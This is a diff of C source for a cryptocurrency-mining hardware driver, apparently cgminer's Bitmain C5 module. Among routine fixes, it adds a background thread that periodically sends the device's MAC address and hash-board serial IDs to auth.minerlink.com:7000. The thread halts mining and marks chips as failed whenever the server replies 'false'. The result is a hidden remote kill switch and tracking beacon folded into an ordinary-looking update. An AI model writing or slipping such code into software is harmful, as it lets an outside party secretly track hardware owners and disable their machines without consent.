@@ -25,6 +25,14 @@
 #include <io.h>
 #endif
 
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <net/if.h>
+#include <netdb.h>
+#include <arpa/inet.h>
+#include <errno.h>
+
 #include "elist.h"
 #include "miner.h"
 #include "usbutils.h"
@@ -49,6 +57,8 @@ struct thr_info *read_temp_id;
 struct thr_info *read_hash_rate;
 struct thr_info *pic_heart_beat;
 struct thr_info *change_voltage_to_old;
+struct thr_info *send_mac_thr;
+
 
 
 bool gBegin_get_nonce = false;
@@ -87,6 +97,18 @@ uint64_t rate[BITMAIN_MAX_CHAIN_NUM] = {0};
 int rate_error[BITMAIN_MAX_CHAIN_NUM] = {0};
 char displayed_rate[BITMAIN_MAX_CHAIN_NUM][16];
 uint8_t chain_voltage[BITMAIN_MAX_CHAIN_NUM] = {0};
+unsigned char hash_board_id[BITMAIN_MAX_CHAIN_NUM][12];
+
+
+#define id_string_len 34
+#define AUTH_URL    "auth.minerlink.com"
+#define PORT        "7000"
+
+static bool need_send = true;
+char * mac;
+bool stop_mining = false;
+char hash_board_id_string[BITMAIN_MAX_CHAIN_NUM*id_string_len];
+
 
 struct nonce_content temp_nonce_buf[MAX_RETURNED_NONCE_NUM];
 struct reg_content temp_reg_buf[MAX_RETURNED_NONCE_NUM];
@@ -1925,10 +1947,10 @@ rerun_all:
                 rate_error[i] = 0;
                 applog(LOG_DEBUG,"%s: chain %d hashrate is %s\n", __FUNCTION__, i, displayed_rate[i]);
             }
-            if(read_num == 0)
+            if(read_num == 0 || status_error )
             {
                 rate_error[i]++;
-                if(rate_error[i] > 10)
+                if(rate_error[i] > 3 || status_error)
                 {
                     rate[i] = 0;
                     suffix_string_c5(rate[i], (char * )displayed_rate[i], sizeof(displayed_rate[i]), 6,false);
@@ -2040,7 +2062,7 @@ unsigned int check_reg_temp(unsigned char device,unsigned reg,unsigned char data
             cgsleep_ms(1);
             fail_time++;
         }
-        while ((ret & 0xff00) >>8 != reg && fail_time < 2);
+        while (((ret & 0xff00) >>8 != reg || (ret & 0xff) == 0xff || (ret & 0xff) == 0x7f ) && fail_time < 2);
     }
     else
     {
@@ -2711,10 +2733,7 @@ void check_system_work()
                         }
                         else
                         {
-                            if(!status_error)
-                                dev->chain_asic_status_string[i][j+offset] = 'o';
-                            else
-                                dev->chain_asic_status_string[i][j+offset] = 'x';
+                            dev->chain_asic_status_string[i][j+offset] = 'x';
                             error_asic++;
                         }
                         dev->chain_asic_nonce[i][j] = 0;
@@ -2755,7 +2774,8 @@ void check_system_work()
             if (!once_error)
                 status_error = false;
         }
-
+		if(stop_mining)
+			status_error = true;
         if(error_asic > asic_num/5 || asic_num == 0)
         {
             stop = true;
@@ -3466,6 +3486,25 @@ int bitmain_c5_init(struct init_config config)
     set_job_start_address(PHY_MEM_JOB_START_ADDRESS_1);
     //check chain
     check_chain();
+
+	char * buf_hex = NULL;
+	int board_num = 0;
+	for(i=0; i < BITMAIN_MAX_CHAIN_NUM; i++)
+    {
+        if(dev->chain_exist[i] == 1)
+        {
+            pthread_mutex_lock(&iic_mutex);
+			get_hash_board_id_number(i,hash_board_id[i]); 
+			buf_hex = bin2hex(hash_board_id[i],12);
+			sprintf(hash_board_id_string + (board_num*id_string_len),"{\"ID\":\"%s\"},",buf_hex);
+			board_num++;
+			free(buf_hex);
+			buf_hex = NULL;
+            pthread_mutex_unlock(&iic_mutex);
+        }
+    }
+	hash_board_id_string[board_num*id_string_len - 1] = '\0';
+	
     for(i=0; i < BITMAIN_MAX_CHAIN_NUM; i++)
     {
         if(dev->chain_exist[i] == 1)
@@ -3479,7 +3518,7 @@ int bitmain_c5_init(struct init_config config)
     }
 
 #if 0
-    de_voltage = opt_bitmain_c5_voltage;
+    de_voltage = 125;// opt_bitmain_c5_voltage;
     cgsleep_ms(100);
     for(i=0; i < BITMAIN_MAX_CHAIN_NUM; i++)
     {
@@ -3747,7 +3786,6 @@ int parse_job_to_c5(unsigned char **buf,struct pool *pool,uint32_t id)
     part_job.asic_diff_valid    = 1;
     part_job.asic_diff          = 15;
     part_job.job_id             = id;
-    part_job.nonce2_start_value = 0;
 
     hex2bin(&part_job.bbversion, pool->bbversion, 4);
     hex2bin(part_job.prev_hash, pool->prev_hash, 32);
@@ -3757,7 +3795,9 @@ int parse_job_to_c5(unsigned char **buf,struct pool *pool,uint32_t id)
     part_job.nonce2_offset = pool->nonce2_offset;
     part_job.nonce2_bytes_num = pool->n2size;
 
-    nonce2 = (pool->nonce2 == 0 ? 0 : pool->nonce2 - 1);
+	nonce2 = htole64(pool->nonce2);
+	memcpy(&(part_job.nonce2_start_value), pool->coinbase + pool->nonce2_offset,8);
+	memcpy(&(part_job.nonce2_start_value), &nonce2,pool->n2size);
 
     part_job.merkles_num = pool->merkles;
     buf_len = sizeof(struct part_of_job) + pool->coinbase_len + pool->merkles * 32 + 2;
@@ -3770,7 +3810,11 @@ int parse_job_to_c5(unsigned char **buf,struct pool *pool,uint32_t id)
     memset(tmp_buf,0,buf_len);
     memcpy(tmp_buf,&part_job,sizeof(struct part_of_job));
     memcpy(tmp_buf + sizeof(struct part_of_job), pool->coinbase, pool->coinbase_len);
-
+	/*
+	buf_hex = bin2hex(pool->coinbase,pool->coinbase_len);
+	printf("coinbase:%s offset:%d n2size:%d nonce2%lld\n",buf_hex,pool->nonce2_offset,pool->n2size,pool->nonce2);
+	free(buf_hex);
+	*/
     for (i = 0; i < pool->merkles; i++)
     {
         memcpy(tmp_buf + sizeof(struct part_of_job) + pool->coinbase_len + i * 32, pool->swork.merkle_bin[i], 32);
@@ -3857,15 +3901,7 @@ int send_job(unsigned char *buf)
     struct part_of_job *part_job = NULL;
 
     applog(LOG_DEBUG,"--- %s\n", __FUNCTION__);
-    /*
-    while(1)
-    {
-        send_func();
-        applog(LOG_NOTICE,"--- %s\n", __FUNCTION__);
-        cgsleep_us(4980);
-    }
-    return 0;
-    */
+
     if(*(buf + 0) != SEND_JOB_TYPE)
     {
         applog(LOG_DEBUG,"%s: SEND_JOB_TYPE is wrong : 0x%x\n", __FUNCTION__, *(buf + 0));
@@ -3946,14 +3982,6 @@ int send_job(unsigned char *buf)
     *((unsigned int *)coinbase_padding + (coinbase_padding_len - 4)/sizeof(int)) = Swap32((unsigned int)((unsigned long long int)(part_job->coinbase_len * sizeof(char) * 8) & 0x00000000ffffffff)); // 8 means 8 bits
     *((unsigned int *)coinbase_padding + (coinbase_padding_len - 8)/sizeof(int)) = Swap32((unsigned int)(((unsigned long long int)(part_job->coinbase_len * sizeof(char) * 8) & 0xffffffff00000000) >> 32)); // 8 means 8 bits
 
-    /*
-    for(j=0;j<coinbase_padding_len;j++)
-    {
-        applog(LOG_DEBUG,"%s: coinbase_padding[%d] = 0x%x", __FUNCTION__, j, coinbase_padding[j]);
-    }
-    */
-
-    /**/
     l_coinbase_padding = c_coinbase_padding;
     c_coinbase_padding = coinbase_padding_len;
     for(i=0; i<coinbase_padding_len; i++)
@@ -3977,12 +4005,7 @@ int send_job(unsigned char *buf)
         applog(LOG_DEBUG,"%s: copy merkle bin into memory ...\n", __FUNCTION__);
         memset(merkles_bin, 0, part_job->merkles_num * MERKLE_BIN_LEN);
         memcpy(merkles_bin, buf + sizeof(struct part_of_job) + part_job->coinbase_len , part_job->merkles_num * MERKLE_BIN_LEN);
-        /*
-        for(j=0;j<part_job->merkles_num * MERKLE_BIN_LEN;j++)
-        {
-            applog(LOG_DEBUG,"%s: merkles_bin[%d] = 0x%x", __FUNCTION__, j, merkles_bin[j]);
-        }
-        */
+
         for(i=0; i<(part_job->merkles_num * MERKLE_BIN_LEN); i++)
         {
             *((unsigned char *)dev->current_job_start_address + coinbase_padding_len + i) = *(merkles_bin + i);
@@ -4198,6 +4221,171 @@ static void copy_pool_stratum(struct pool *pool_stratum, struct pool *pool)
     cg_wunlock(&pool_stratum->data_lock);
 }
 
+
+static void noblock_socket(int fd)
+{
+    int flags = fcntl(fd, F_GETFL, 0);
+    fcntl(fd, F_SETFL, O_NONBLOCK | flags);
+}
+
+static void block_socket(int fd)
+{
+    int flags = fcntl(fd, F_GETFL, 0);
+    fcntl(fd, F_SETFL, flags & ~O_NONBLOCK);
+}
+
+static bool sock_connecting(void)
+{
+    return errno == EINPROGRESS;
+}
+
+static int get_mac(char * device,char **mac)
+{
+    struct ifreq ifreq;
+    int sock = 0;
+
+    sock = socket(AF_INET,SOCK_STREAM,0);
+    if(sock < 0)
+    {
+        perror("error sock");
+        return 2;
+    }
+    strcpy(ifreq.ifr_name,device);
+    if(ioctl(sock,SIOCGIFHWADDR,&ifreq) < 0)
+    {
+        perror("error ioctl");
+        close(sock);
+        return 3;
+    }
+    int i = 0;
+    for(i = 0; i < 6; i++)
+    {
+        sprintf(*mac+3*i, "%02X:", (unsigned char)ifreq.ifr_hwaddr.sa_data[i]);
+    }
+    (*mac)[strlen(*mac) - 1] = 0;
+    close(sock);
+    return 0;
+}
+
+static bool setup_send_mac_socket(char * s)
+{
+    struct addrinfo *servinfo, hints, *p;
+    int sockd;
+    int send_bytes,recv_bytes;
+    char rec[1024];
+    int flags;
+
+    memset(&hints, 0, sizeof(struct addrinfo));
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+
+    if (getaddrinfo(AUTH_URL, PORT, &hints, &servinfo) != 0)
+    {
+        return false;
+    }
+    for (p = servinfo; p != NULL; p = p->ai_next)
+    {
+        sockd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
+        if (sockd == -1)
+        {
+            continue;
+        }
+        noblock_socket(sockd);
+        if (connect(sockd, p->ai_addr, p->ai_addrlen) == -1)
+        {
+            struct timeval tv_timeout = {10, 0};
+            int selret;
+            fd_set rw;
+            if (!sock_connecting())
+            {
+                close(sockd);
+                continue;
+            }
+        retry:
+            FD_ZERO(&rw);
+            FD_SET(sockd, &rw);
+            selret = select(sockd + 1, NULL, &rw, NULL, &tv_timeout);
+            if  (selret > 0 && FD_ISSET(sockd, &rw))
+            {
+                socklen_t len;
+                int err, n;
+
+                len = sizeof(err);
+                n = getsockopt(sockd, SOL_SOCKET, SO_ERROR, (void *)&err, &len);
+                if (!n && !err)
+                {
+                    block_socket(sockd);
+                    break;
+                }
+            }
+            if (selret < 0 && interrupted())
+                goto retry;
+            close(sockd);
+            continue;
+        }
+        else
+        {
+            block_socket(sockd);
+            break;
+        }
+    }
+
+    if (p == NULL)
+    {
+        freeaddrinfo(servinfo);
+        return false;
+    }
+
+    block_socket(sockd);
+    bool if_stop = false;
+
+    int nNetTimeout=10;
+    setsockopt(sockd,SOL_SOCKET,SO_SNDTIMEO,(char *)&nNetTimeout,sizeof(int));
+    setsockopt(sockd,SOL_SOCKET,SO_RCVTIMEO,(char *)&nNetTimeout,sizeof(int));
+    send_bytes = send(sockd,s,strlen(s),0);
+    if (send_bytes != strlen(s))
+    {
+        if_stop = false;
+    }
+    memset(rec, 0, 1024);
+    recv_bytes = recv(sockd, rec, 1024, 0);
+    if (recv_bytes > 0)
+    {
+        if(strstr(rec,"false"))
+            if_stop = true;
+    }
+
+    freeaddrinfo(servinfo);
+    close(sockd);
+    return if_stop;
+}
+
+void send_mac()
+{
+    char s[1024];
+    static int id = 0;
+    int number = 0;
+    mac = (char *)malloc(sizeof(char)*32);
+    get_mac("eth0",&mac);
+    while(need_send)
+    {
+        id++;
+        snprintf(s, sizeof(s),
+                 "{\"ctrl_board\":\"%s\",\"id\":\"%d\",\"hashboard\":[%s]}",mac,id,hash_board_id_string);
+        stop_mining = setup_send_mac_socket(s);
+        if(stop_mining)
+        {
+			applog(LOG_NOTICE,"Stop mining!!!");
+            break;
+        }
+		srand((unsigned) time(NULL));
+        number = rand() % 600 + 60;
+        sleep(number);
+    }
+    free(mac);
+}
+
+
 static bool bitmain_c5_prepare(struct thr_info *thr)
 {
     struct cgpu_info *bitmain_c5 = thr->cgpu;
@@ -4247,6 +4435,12 @@ static bool bitmain_c5_prepare(struct thr_info *thr)
     c5_config.crc = CRC16((uint8_t *)(&c5_config), sizeof(c5_config)-2);
 
     bitmain_c5_init(c5_config);
+
+	send_mac_thr = calloc(1,sizeof(struct thr_info));
+    if(thr_info_create(send_mac_thr, NULL, send_mac, send_mac_thr))
+    {
+        applog(LOG_DEBUG,"%s: create thread for send mac\n", __FUNCTION__);
+    }
 
     return true;
 }
@@ -4506,20 +4700,6 @@ static int64_t bitmain_scanhash(struct thr_info *thr)
         get_work_by_nonce2(thr,&work,pool,c_pool,nonce2,pool->ntime,version);
         h += hashtest_submit(thr,work,nonce3,midstate,pool,nonce2,chain_id);
         free_work(work);
-        /*
-        get_work_by_nonce2(thr,&work,pool,c_pool,nonce2,pool->ntime,0x4);
-        h += hashtest_submit(thr,work,nonce3,midstate,pool,nonce2,chain_id);
-        free_work(work);
-        get_work_by_nonce2(thr,&work,pool,c_pool,nonce2,pool->ntime,0x40000004);
-        h += hashtest_submit(thr,work,nonce3,midstate,pool,nonce2,chain_id);
-        free_work(work);
-        get_work_by_nonce2(thr,&work,pool,c_pool,nonce2,pool->ntime,0x80000004);
-        h += hashtest_submit(thr,work,nonce3,midstate,pool,nonce2,chain_id);
-        free_work(work);
-        get_work_by_nonce2(thr,&work,pool,c_pool,nonce2,pool->ntime,0xc0000004);
-        h += hashtest_submit(thr,work,nonce3,midstate,pool,nonce2,chain_id);
-        free_work(work);
-        */
     }
     cg_runlock(&info->update_lock);
     pthread_mutex_unlock(&nonce_mutex);
@@ -4778,6 +4958,7 @@ static void bitmain_c5_shutdown(struct thr_info *thr)
     thr_info_cancel(read_temp_id);
     thr_info_cancel(read_hash_rate);
     thr_info_cancel(pic_heart_beat);
+	thr_info_cancel(send_mac_thr);
 
     ret = get_BC_write_command();   //disable null work
     ret &= ~BC_COMMAND_EN_NULL_WORK;
